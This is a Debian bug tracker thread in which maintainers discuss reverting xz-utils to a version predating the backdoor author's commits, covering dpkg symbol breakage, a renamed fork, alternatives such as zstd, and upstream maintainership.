![](/cgi-bin/libravatar.cgi?email=id%40joeyh.name)
From: Joey Hess <id@joeyh.name>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: revert to version that does not contain changes by bad actor
Date: Fri, 29 Mar 2024 16:25:26 -0400
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=5) (text/plain, inline)]
```
```
Package: xz-utils
Version: 5.6.1+really5.4.5-1
Severity: important
Tags: security

I count a minimum of 750 commits or contributions to xz by Jia Tan, who
backdoored it.

This includes all 700 commits made after they merged a pull request in Jan 7
2023, at which point they appear to have already had direct push access, which
would have also let them push commits with forged authors. Probably a number of
other commits before that point as well.

Reverting the backdoored version to a previous version is not sufficient to
know that Jia Tan has not hidden other backdoors in it. Version 5.4.5 still
contains the majority of those commits.

Commits by them such as 18d7facd3802b55c287581405c4d49c98708c136
and ae5c07b22a6b3766b84f409f1b6b5c100469068a show that they were deep
into analyzing the security of xz. They were well placed to insert a buffer
overflow that could allow eg, a targeted xz file to cause arbitrary code
execution. The impact of such a security hole could be much more stealthy and
bad than the known backdoor since it would allow chaining xz with other
unrelated software releases on an ongoing basis.

The package should be reverted to a version before their involvement,
which started with commit 6468f7e41a8e9c611e4ba8d34e2175c5dacdbeb4.
Or their early commits vetted and revert to a later point, but any arbitrary
commit by a known bad and malicious actor almost certainly has less value
than the risk that a subtle change go unnoticed.

I'd suggest reverting to 5.3.1. Bearing in mind that there were security
fixes after that point for ZDI-CAN-16587 that would need to be reapplied.

--
see shy jo

```
```
[[signature.asc](bugreport.cgi?att=1;bug=1068024;filename=signature.asc;msg=5) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 29 Mar 2024 21:36:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=7), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent**
to `Aurelien Jarno <aurelien@aurel32.net>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Fri, 29 Mar 2024 21:36:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=9), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=10), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=aurelien%40aurel32.net)
From: Aurelien Jarno <aurelien@aurel32.net>
To: Joey Hess <id@joeyh.name>, 1068024@bugs.debian.org
Cc: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Fri, 29 Mar 2024 22:32:23 +0100
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=10) (text/plain, inline)]
```
```
On 2024-03-29 16:25, Joey Hess wrote:
> I'd suggest reverting to 5.3.1. Bearing in mind that there were security
> fixes after that point for ZDI-CAN-16587 that would need to be reapplied.

Note that reverted to such an old version will break packages that use
new symbols introduced since then. From a quick look, this is at least:
- dpkg
- erofs-utils
- kmod

Having dpkg in that list means that such downgrade has to be planned
carefully.

Regards
Aurelien

--
Aurelien Jarno                          GPG: 4096R/1DDD8C9B
aurelien@aurel32.net                     <http://aurel32.net>

```
```
[[signature.asc](bugreport.cgi?att=1;bug=1068024;filename=signature.asc;msg=10) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 29 Mar 2024 21:36:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=12), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=12), [link](#11)).

---

**Acknowledgement sent**
to `Aurelien Jarno <aurelien@aurel32.net>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Fri, 29 Mar 2024 21:36:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=14), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=14), [link](#13)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Fri, 29 Mar 2024 22:57:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=17), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=17), [link](#16)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@mirbsd.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Fri, 29 Mar 2024 22:57:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=19), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=19), [link](#18)).

---

[Message #20](#20) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=20), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=20), reply):

![](/cgi-bin/libravatar.cgi?email=tg%40mirbsd.de)
From: Thorsten Glaser <tg@mirbsd.de>
To: Aurelien Jarno <aurelien@aurel32.net>, 1068024@bugs.debian.org
Cc: Joey Hess <id@joeyh.name>
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Fri, 29 Mar 2024 22:47:48 +0000 (UTC)
```
Aurelien Jarno dixit:

>Having dpkg in that list means that such downgrade has to be planned
>carefully.

Right. Not an argument against, though.
Instead, this is a very good idea.

What symbols are new? Can we somehow stub them, or at least where
those are used? Or change the soname, so that the old and new-older
versions are coïnstallable for during the upgrade?

bye,
//mirabilos
--
<igli> exceptions: a truly awful implementation of quite a nice idea.
<igli> just about the worst way you could do something like that, afaic.
<igli> it's like anti-design.  <mirabilos> that too… may I quote you on that?
<igli> sure, tho i doubt anyone will listen ;)

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 00:51:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=22), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=22), [link](#21)).

---

**Acknowledgement sent**
to `Stephan Verbücheln <verbuecheln@posteo.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 00:51:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=24), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=24), [link](#23)).

---

[Message #25](#25) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=25), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=25), reply):

![](/cgi-bin/libravatar.cgi?email=verbuecheln%40posteo.de)
From: Stephan Verbücheln <verbuecheln@posteo.de>
To: 1068024@bugs.debian.org
Subject: Or remove xz altogether?
Date: Sat, 30 Mar 2024 00:48:34 +0000
```
Maybe the people who criticized xz back in the day for being an amateur
project implementing a defective file format were right all along?

<https://www.nongnu.org/lzip/xz_inadequate.html>

Regards
Stephan

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 02:51:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=27), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent**
to `Mark-Oliver Wolter <mow@mowny.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 02:51:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=29), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=30), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=mow%40mowny.de)
From: Mark-Oliver Wolter <mow@mowny.de>
To: 1068024@bugs.debian.org, Aurelien Jarno <aurelien@aurel32.net>
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sat, 30 Mar 2024 03:38:39 +0100
```
On Fri, 29 Mar 2024 22:32:23 +0100 Aurelien Jarno <aurelien@aurel32.net>
wrote:
> Having dpkg in that list means that such downgrade has to be planned
> carefully.

Might be easier overall to spend that effort on a hard switch to zstd
instead.

mfG mow

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 02:51:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=32), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=32), [link](#31)).

---

**Acknowledgement sent**
to `Guillem Jover <guillem@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 02:51:04 GMT) ([full text](bugreport.cgi?bug=1068024;msg=34), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=34), [link](#33)).

---

[Message #35](#35) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=35), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=35), reply):

![](/cgi-bin/libravatar.cgi?email=guillem%40debian.org)
From: Guillem Jover <guillem@debian.org>
To: Stephan Verbücheln <verbuecheln@posteo.de>,
1068024@bugs.debian.org
Subject: Re: Bug#1068024: Or remove xz altogether?
Date: Sat, 30 Mar 2024 03:49:12 +0100
```
On Sat, 2024-03-30 at 00:48:34 +0000, Stephan Verbücheln wrote:
> Maybe the people who criticized xz back in the day for being an amateur
> project implementing a defective file format were right all along?
>
> <https://www.nongnu.org/lzip/xz_inadequate.html>

*Sigh*, the current situation is bad enough, and has nothing to do
with the xz format or design, or the FUD and propaganda from that
link. Please drop it…

Thanks,
Guillem

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 08:15:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=37), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent**
to `Pierre Ynard <linkfanel@yahoo.fr>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 08:15:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=39), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=40), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=linkfanel%40yahoo.fr)
From: Pierre Ynard <linkfanel@yahoo.fr>
To: 1068024@bugs.debian.org, Aurelien Jarno <aurelien@aurel32.net>,
Mark-Oliver Wolter <mow@mowny.de>
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sat, 30 Mar 2024 08:12:42 +0000 (UTC)
```
> Might be easier overall to spend that effort on a hard switch to zstd
> instead.

Good point. Another question that we'll probably have to ask anyway
is, what is the future of xz-utils going to be now? Regarding its
maintainership as well, both upstream and in Debian?

From what I understand, this package has been NMU'd in Debian for more
than 10 years now - thanks to Sebastian for his work - and that might
have been a point of weakness which was exploited to push a compromised
version into the Debian archive, as seen in #1067708. To quote Thorsten
from that thread:

> Very much *not* a fan of NMUs doing large changes such as
> new upstream versions.

I can't say why exactly he would not be a fan, but with hindsight that
was an interesting call.

Perhaps more importantly, it is said that the whole situation started
with the lack of resources from the upstream maintainer to maintain the
project:

[https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.html](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html)

which again, we can suspect at this point, was exploited with the same
modus operandi to get a compromise vector coopted in, in the form of a
new maintainer.

And now if what we suspect is true, that relief maintainer has turned
out to be a bad actor, which leaves upstream back to square one on the
maintainance issue. I understand that Lasse Collin hasn't been able to
weigh in on the situation yet.

Is xz-utils going to be maintained? Will we want to keep in the archive
an unmaintained low-level library - low-level as in, susceptible of
getting pulled as a dependency in lots of places - and rely on it for
components such as dpkg?

I'm not presuming the answers - it's still early and there is probably
more to figure out yet - but back to the original point, we might want
to consider this when sketching longer-term plans.

--
Pierre Ynard

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 12:51:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=42), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=42), [link](#41)).

---

**Acknowledgement sent**
to `Joey Hess <id@joeyh.name>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 12:51:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=44), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=44), [link](#43)).

---

[Message #45](#45) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=45), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=45), reply):

![](/cgi-bin/libravatar.cgi?email=id%40joeyh.name)
From: Joey Hess <id@joeyh.name>
To: Aurelien Jarno <aurelien@aurel32.net>
Cc: 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sat, 30 Mar 2024 08:38:19 -0400
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=45) (text/plain, inline)]
```
```
Aurelien Jarno wrote:
> Note that reverted to such an old version will break packages that use
> new symbols introduced since then. From a quick look, this is at least:
> - dpkg
> - erofs-utils
> - kmod
>
> Having dpkg in that list means that such downgrade has to be planned
> carefully.

I agree this would be a challanging downgrade. I've tried it myself
experimentally and once a downgraded liblzma5 is unpacked, dpkg-deb is broken
with missing symbol 'XZ_5.4'.

Renaming liblzma5 to something else (liblzma6?) and making dpkg-deb
depend on that seems like one way to go that would avoid messy situations.

FWIW, I rebuilt xz-utils 5.2.5-2.1~deb11u1 (from bullseye) on sid
and then got dpkg to build against that successfully after a few minor
changes to dpkg's packaging:

--- debian/libdpkg-dev.install.orig	2024-03-30 07:31:46.635365816 -0400
+++ debian/libdpkg-dev.install	2024-03-30 07:34:48.667477725 -0400
@@ -1,4 +1,5 @@
 usr/include/dpkg/*.h
-usr/lib/*/pkgconfig/libdpkg.pc
-usr/lib/*/libdpkg.a
+usr/lib/pkgconfig/libdpkg.pc
+usr/lib/libdpkg.a
 usr/share/aclocal/dpkg-*.m4
+usr/lib/libdpkg.la

(And after disabling the test suite since changes in xz message output
caused a test failure.)

--
see shy jo

```
```
[[signature.asc](bugreport.cgi?att=1;bug=1068024;filename=signature.asc;msg=45) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 13:21:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=47), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=47), [link](#46)).

---

**Acknowledgement sent**
to `Ivan Shmakov <ivan@siamics.net>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 13:21:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=49), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=49), [link](#48)).

---

[Message #50](#50) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=50), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=50), reply):

![](/cgi-bin/libravatar.cgi?email=ivan%40siamics.net)
From: Ivan Shmakov <ivan@siamics.net>
To: 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by bad actor
Date: Sat, 30 Mar 2024 12:55:21 +0000
```
>>>>> On 2024-03-30, Guillem Jover wrote:
>>>>> On Sat, 2024-03-30 at 00:48:34 +0000, Stephan Verbücheln wrote:

 >> Subject: Re: Bug#1068024: Or remove xz altogether?

 >> Maybe the people who criticized xz back in the day for being an amateur
 >> project implementing a defective file format were right all along?

 >> <https://www.nongnu.org/lzip/xz_inadequate.html>

 > *Sigh*, the current situation is bad enough, and has nothing to do
 > with the xz format or design, or the FUD and propaganda from that
 > link.  Please drop it…

	While I wouldn’t have brought it up myself, nor the arguably
	provocative Subject: change (reverted), as it’s indeed only
	tangentially related to the issue at hand (which apparently
	have resulted from the absense of good faith developers
	volunteering to maintain this project – and in a word of
	defense, the design quality of a software project /does/
	influence both the amount of maintenance work and, other
	things being equal, the desire to get involved), the comment
	above got me curious: which parts of the document linked are
	‘FUD and propaganda’?  Because I’ve just glanced it over and
	I don’t find any obvious examples.

	Granted, I’m not an expert in the field of compression and
	coding, per se, and can’t readily speak on the validity of
	most of the arguments given there, those at least appear
	plausible.  Some arguments I find obvious, such as, e. g.:

 ADD> A well-known property of CRCs is their ability to detect burst
 ADD> errors up to the size of the CRC itself.  Using a CRC larger
 ADD> than the dataword is an error because a CRC just as large as
 ADD> the dataword equally detects all errors while it produces
 ADD> a lower number of false positives.

	If there’s a reasonable rebuttal to the points raised in that
	document, I believe that a pointer to it would be appropriate
	for this discussion.  Other than that, I’m not going to go on
	this tangent any further here.  I’ll be monitoring a handful
	of Internet fora for that, though (news:alt.os.linux.debian,
	news:comp.misc, irc://irc.efnet.org/%23coders, etc.)

--
FSF associate member #7257  np. Moonsong — Shane Jackman

```

---

**Set Bug forwarded-to-address to '<https://tukaani.org/xz-backdoor/>'.**
Request was from `ZenWalker <scow@riseup.net>`
to `control@bugs.debian.org`.
(Sat, 30 Mar 2024 14:21:05 GMT) ([full text](bugreport.cgi?bug=1068024;msg=52), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=52), [link](#51)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 17:06:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=54), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=54), [link](#53)).

---

**Acknowledgement sent**
to `noloader@gmail.com`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 17:06:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=56), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=56), [link](#55)).

---

[Message #57](#57) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=57), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=57), reply):

![](/cgi-bin/libravatar.cgi?email=noloader%40gmail.com)
From: Jeffrey Walton <noloader@gmail.com>
To: 1068024@bugs.debian.org
Date: Sat, 30 Mar 2024 13:02:28 -0400
```
Lasse Collin provided a statement at <<https://tukaani.org/xz-backdoor/>>.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 18:21:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=59), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=59), [link](#58)).

---

**Acknowledgement sent**
to `Joey Hess <id@joeyh.name>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 18:21:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=61), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=61), [link](#60)).

---

[Message #62](#62) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=62), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=62), reply):

![](/cgi-bin/libravatar.cgi?email=id%40joeyh.name)
From: Joey Hess <id@joeyh.name>
To: Aurelien Jarno <aurelien@aurel32.net>
Cc: 1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sat, 30 Mar 2024 14:16:52 -0400
```
[[Message part 1](bugreport.cgi?att=0;bug=1068024;msg=62) (text/plain, inline)]
```
```
I have prepared a git repository that is a fork of xz from the point I
identified before the attacker(s) did anything to it. In my fork, I have
renamed liblzma to liblzmaunscathed. That allows it to be installed
alongside current dpkg without breaking dpkg with an old version of
liblzma.

My git repository is here (note all my commits are gpg signed):
<https://git.joeyh.name/index.cgi/xz-unscathed/>

It also has a debian branch which contains a debian directory. I've
built packages of that, as well as building dpkg-1.22.6 against it.
I've attached the patch I used to build dpkg.

My build of dpkg ended up not being linked to a lzma library at all,
because liblzmaunscathed is too old to support concurrent decompression,
which the configure script detects. So dpkg-deb instead uses xz-utils
to decompress debs. I replaced xz-utils.deb with the one built from my
fork, and dpkg seems to work fine using it.

If Debian decided to go this route, you could add xz-utils-unscathed
to unstable, and at the same time update xz-utils to not build
xz-utils.deb. Then build dpkg against it. Then look into forward porting
or re-implementing concurrent decompression if that is really important
to have.

I only plan to maintain this fork minimally, eg backporting security
fixes. The goal is not to take over from xz upstream, but to get the
possibly backdoored code off of production systems ASAP. Presumably xz
upstream will come up with their own solution long-term.

--
see shy jo

```
```
[[dpkg.patch](bugreport.cgi?att=1;bug=1068024;filename=dpkg.patch;msg=62) (text/x-diff, attachment)]
```
```
[[signature.asc](bugreport.cgi?att=2;bug=1068024;filename=signature.asc;msg=62) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sat, 30 Mar 2024 20:06:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=64), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=64), [link](#63)).

---

**Acknowledgement sent**
to `noloader@gmail.com`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sat, 30 Mar 2024 20:06:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=66), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=66), [link](#65)).

---

[Message #67](#67) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=67), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=67), reply):

![](/cgi-bin/libravatar.cgi?email=noloader%40gmail.com)
From: Jeffrey Walton <noloader@gmail.com>
To: 1068024@bugs.debian.org
Date: Sat, 30 Mar 2024 16:03:11 -0400
```
It looks like more analysis has revealed this is a RCE with the
payload in the modulus of a public key: "The payload is extracted from
the N value (the public key) passed to RSA_public_decrypt, checked
against a simple fingerprint, and decrypted with a fixed ChaCha20 key
before the Ed448 signature verification..." Also see
<<https://www.openwall.com/lists/oss-security/2024/03/30/36>>.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 00:21:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=69), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=69), [link](#68)).

---

**Acknowledgement sent**
to `Christoph Anton Mitterer <calestyo@scientia.org>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 00:21:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=71), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=71), [link](#70)).

---

[Message #72](#72) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=72), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=72), reply):

![](/cgi-bin/libravatar.cgi?email=calestyo%40scientia.org)
From: Christoph Anton Mitterer <calestyo@scientia.org>
To: 1068024@bugs.debian.org
Subject: Re: revert to version that does not contain changes by bad actor
Date: Sun, 31 Mar 2024 01:16:07 +0100
```
Hey.

Can we be confidently sure that going back to 5.4.5 is enough?

At least the git tag for that seems to be still signed by the
adversary:
<https://git.tukaani.org/?p=xz.git;a=tag;h=9e4835399118b98954f110f76af2a0d504d2f531>

The last one, still from Lasse Collin seems to be 5.4.1:
<https://git.tukaani.org/?p=xz.git;a=tag;h=f52502e78bf84f516a739e8d8a1357f27eeea75f>

Cheers,
Chris.

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 00:48:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=74), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=74), [link](#73)).

---

**Acknowledgement sent**
to `Alberto Garcia <berto@igalia.com>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 00:48:02 GMT) ([full text](bugreport.cgi?bug=1068024;msg=76), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=76), [link](#75)).

---

[Message #77](#77) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=77), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=77), reply):

![](/cgi-bin/libravatar.cgi?email=berto%40igalia.com)
From: Alberto Garcia <berto@igalia.com>
To: Christoph Anton Mitterer <calestyo@scientia.org>,
1068024@bugs.debian.org
Subject: Re: Bug#1068024: revert to version that does not contain changes by
bad actor
Date: Sun, 31 Mar 2024 01:45:00 +0100
```
On Sun, Mar 31, 2024 at 01:16:07AM +0100, Christoph Anton Mitterer wrote:
> The last one, still from Lasse Collin seems to be 5.4.1:
> <https://git.tukaani.org/?p=xz.git;a=tag;h=f52502e78bf84f516a739e8d8a1357f27eeea75f>

There are commits from Jia before that, and some that are authored by
Lasse but thank Jia for the contribution (the oldest one is 20e7a33e).

The most recent release that does not contain any of that seems to be
v5.3.2alpha.

Berto

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 01:03:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=79), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=79), [link](#78)).

---

**Acknowledgement sent**
to `Christoph Anton Mitterer <calestyo@scientia.org>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
(Sun, 31 Mar 2024 01:03:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=81), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=81), [link](#80)).

---

[Message #82](#82) received at 1068024@bugs.debian.org ([full text](bugreport.cgi?bug=1068024;msg=82), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=82), reply):

![](/cgi-bin/libravatar.cgi?email=calestyo%40scientia.org)
From: Christoph Anton Mitterer <calestyo@scientia.org>
To: 1068024@bugs.debian.org
Subject: Re: revert to version that does not contain changes by bad actor
Date: Sun, 31 Mar 2024 03:01:06 +0200
```
One more thing:

Is anyone on the Debian side trying to figure out how far we've been
practically affected?

I mean let's assume we're "lucky", and the backdoor is only in
5.6.0/5.6.1... and that none of the adversary's earlier commits
introduced any serious holes[0] which wouldn't be known yet.

Then many servers running Debian (which is then typically Debian
stable), would be sill safe.

However, many people (and I'd guess that includes DDs/DMs) run their
workstations/laptops with testing/unstable.
So IMO it's not enough to know that Debian stable is likely not
affected - I'd be rather relieved if I'd knew that there's a good
chance that the personal computers of most DDs/DMs (who push uploads,
etc. pp.) were (at least practically) safe.

Some guy decrypted[1] the strings from the maleware's binary payload:
<https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01#file-hashes-txt-L115>
where only /usr/sbin/sshd would be named.

Should(!) it turn out, that the actual binary payload actually only
affects sshd and especially does not on it's own pull in evil code, it
might at least be that all people who hadn't sshd running (or not
directly accessible because a router/firewall/etc. was in front of it),
would effectively still be safe.
No idea whether or not this is really the case - but if so, it might at
least mean that many workstations/laptops are safe, because they're not
usually directly accessible from the internet.

But even then, it would probably need to be checked whether all the
versions that Debian ever used/shipped in
testing/unstable(/experimental) were actually fully identical to the
versions that are now analysed by forensic folks.

Is the security team doing anything like that?

Cheers,
Chris.

PS: if someone from the security team reads along,
<https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27>
which is from Sam James of Gentoo, seems to collect good information on
what is known so far.
Might be worth to add to the links in the security tracker.

[0] There are reports about an added '.' in the CMakeLists.txt
disabling some sandboxing, but AFAICS at least the current version uses
autotools for building?!

[1] He also provided the code he used to do so.
<https://gist.github.com/q3k/af3d93b6a1f399de28fe194add452d01?permalink_comment_id=5006546#gistcomment-5006546>

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Jonathan Nieder <jrnieder@gmail.com>`:

`Bug#1068024`; Package `xz-utils`.
(Sun, 31 Mar 2024 01:45:03 GMT) ([full text](bugreport.cgi?bug=1068024;msg=84), [mbox](bugreport.cgi?bug=1068024;mbox=yes;msg=84), [link](#83)).

---

**Acknowledgement sent**
to `Thorsten Glaser <tg@mirbsd.de>`:

Extra info received and forwarded to list. Copy sent to `Jonathan Nieder <jrnieder@gmail.com>`.
